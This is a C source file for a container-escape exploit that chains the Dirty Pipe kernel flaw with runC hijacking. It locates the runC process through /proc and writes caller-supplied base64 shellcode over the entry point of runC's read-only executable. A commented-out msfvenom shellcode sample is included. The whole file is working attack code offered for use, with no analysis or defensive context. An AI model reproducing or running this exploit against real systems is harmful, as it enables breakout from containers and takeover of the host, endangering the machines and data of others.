#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/user.h>
#include <stdint.h>
#include <dirent.h>

uint64_t readELfEntry(int fd){
    uint64_t entryPoint;
    
    lseek(fd,24,SEEK_SET);
    read(fd,&entryPoint,8);
	lseek(fd,0,SEEK_SET);
    printf("[+] Entry point address: %#lx\n",entryPoint);
    return entryPoint;
}

static void prepare_pipe(int p[2])
{
	if (pipe(p)) abort();

	const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
	static char buffer[4096];

	/* fill the pipe completely; each pipe_buffer will now have
	   the PIPE_BUF_FLAG_CAN_MERGE flag */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		write(p[1], buffer, n);
		r -= n;
	}

	/* drain the pipe, freeing all pipe_buffer instances (but
	   leaving the flags initialized) */
	for (unsigned r = pipe_size; r > 0;) {
		unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
		read(p[0], buffer, n);
		r -= n;
	}

	/* the pipe is now empty, and if somebody adds a new
	   pipe_buffer without initializing its "flags", the buffer
	   will be mergeable */
}
int hax(char *filename, uint8_t *data, size_t len) {
	/* open the input file and validate the specified offset */
	const int fd = open(filename, O_RDONLY); // yes, read-only! :-)
	if (fd < 0) {
		perror("open failed");
		return -1;
	}

	struct stat st;
	if (fstat(fd, &st)) {
		perror("stat failed");
		return -1;
	}

	/* create the pipe with all flags initialized with
	   PIPE_BUF_FLAG_CAN_MERGE */
	int p[2];
	prepare_pipe(p);

	/* splice one byte from before the specified offset into the
	   pipe; this will add a reference to the page cache, but
	   since copy_page_to_iter_pipe() does not initialize the
	   "flags", PIPE_BUF_FLAG_CAN_MERGE is still set */
    
    uint64_t offset = readELfEntry(fd);
	--offset;
	ssize_t nbytes = splice(fd, &offset, p[1], NULL, 1, 0);
	if (nbytes < 0) {
		perror("splice failed");
		return -1;
	}
	if (nbytes == 0) {
		fprintf(stderr, "short splice\n");
		return -1;
	}

	/* the following write will not create a new pipe_buffer, but
	   will instead write into the page cache, because of the
	   PIPE_BUF_FLAG_CAN_MERGE flag */
	nbytes = write(p[1], data, len);
	if (nbytes < 0) {
		perror("write failed");
		return -1;
	}
	if ((size_t)nbytes < len) {
		fprintf(stderr, "short write\n");
		return -1;
	}

	close(fd);

	return 0;
}

pid_t direntList(char *dirPath){
    DIR *dir = NULL;
    struct dirent *entry;
    dir = opendir(dirPath);

    if(dir == NULL){
        printf("[~] Open dir failed!\n");
        exit(1);
    }
    else{
        while ((entry=readdir(dir)) != NULL){
            pid_t tmpPid = atoi(entry->d_name);
            if(tmpPid!=0){
                char fileName[256] = {0};
                sprintf(fileName,"%s/%d/cmdline",dirPath,tmpPid);

                int tmpFd;
                if((tmpFd = open(fileName,O_RDONLY))!= -1){
                    //printf("pid %d\n",tmpPid);
                    char cmdline[32] = {0};
                    if(read(tmpFd,cmdline,31)>0){
                        if(strstr(cmdline,"/proc/self/exe")!=NULL){
                            close(tmpFd);
                            closedir(dir);
                            return tmpPid;
                        }
                    }
                }
                close(tmpFd);     
            }     
        }
        closedir(dir);
    }
    return 0;
}

const char base64char[] = {
        'A','B','C','D','E','F','G','H','I','J',
        'K','L','M','N','O','P','Q','R','S','T',
        'U','V','W','X','Y','Z','a','b','c','d',
        'e','f','g','h','i','j','k','l','m','n',
        'o','p','q','r','s','t','u','v','w','x',
        'y','z','0','1','2','3','4','5','6','7',
        '8','9','+', '/', '\0'
};

void base64_decode(char const* base64Str, char* debase64Str, int encodeStrLen)
{
    int i = 0;
    int j = 0;
    int k = 0;
    char temp[4] = "";
   	for (i = 0; i < encodeStrLen; i += 4) {
        for (j = 0; j < 64; j++) {
            if (*(base64Str + i) == base64char[j]) {
                temp[0] = j;
            }
        }        
        for (j = 0; j < 64; j++) {
            if (*(base64Str + i + 1) == base64char[j]) {
                temp[1] = j;
            }
        }
        for (j = 0; j < 64; j++) {
            if (*(base64Str + i + 2) == base64char[j]) {
                temp[2] = j;
            }
        }
        for (j = 0; j < 64; j++) {
            if (*(base64Str + i + 3) == base64char[j]) {
                temp[3] = j;
            }
        }
        *(debase64Str + k++) = ((temp[0] << 2) & 0xFC) | ((temp[1] >> 4) & 0x03);
        if (*(base64Str + i + 2) == '=')
            break;
        *(debase64Str + k++) = ((temp[1] << 4) & 0xF0) | ((temp[2] >> 2) & 0x0F);
        if (*(base64Str + i + 3) == '=')
            break;
        *(debase64Str + k++) = ((temp[2] << 6) & 0xF0) | (temp[3] & 0x3F);
    }
}

//Generated using msfvenom -p linux/x64/exec CMD="date > /tmp/hacked" -f c
// const unsigned char shellcode[] = 
// "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
// "\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x14\x00"
// "\x00\x00\x64\x61\x74\x65\x20\x3e\x20\x20\x2f\x74\x6d\x70\x2f"
// "\x68\x61\x63\x6b\x65\x64\x00\x56\x57\x48\x89\xe6\x0f\x05";


void main(int argc, char *argv[]){

	if (argc!=3){
		printf("Usage:%s <overwritten filename> <base64 shellcode>\n",argv[0]);
		exit(1);
	}
	
	char *fileName = calloc(strlen(argv[1])+1,sizeof(char));
	strcpy(fileName,argv[1]);
    
	FILE *filePtr;
    filePtr = fopen(fileName,"w");
    char payload[] = "#!/proc/self/exe\n";
    if(fwrite(payload,sizeof(payload),1,filePtr)>0){
        printf("[+] Overwritten %s successfully\n",fileName);
        fclose(filePtr);
    }
    else{
		printf("[~] %s can not be overwritten\n",fileName);
        exit(1);
    }
	free(fileName);

	int encLen = strlen(argv[2]);
	if (encLen%4!=0){
		printf("[~] shellcode should be base64 encoded\n");
		exit(1);
	}

	int decLen = encLen/4*3;
	char *shellcode = calloc(decLen,sizeof(char));
	base64_decode(argv[2],shellcode,encLen);

    pid_t runcPid = 0;
    while (!runcPid)
    {
        runcPid =  direntList("/proc");
    }
    printf("[+] Found runC PID: %d\n",runcPid);
    char runcPath[32] = {0};
    sprintf(runcPath,"/proc/%d/exe",runcPid);
    
	printf("[+] Hijacking runC..\n");
	if (hax(runcPath, shellcode, decLen) != 0) {
		printf("[~] Failed\n");
		exit(1);
	}

	printf("[+] Successfully injected shellcode into runC!\n");

	exit(0);
}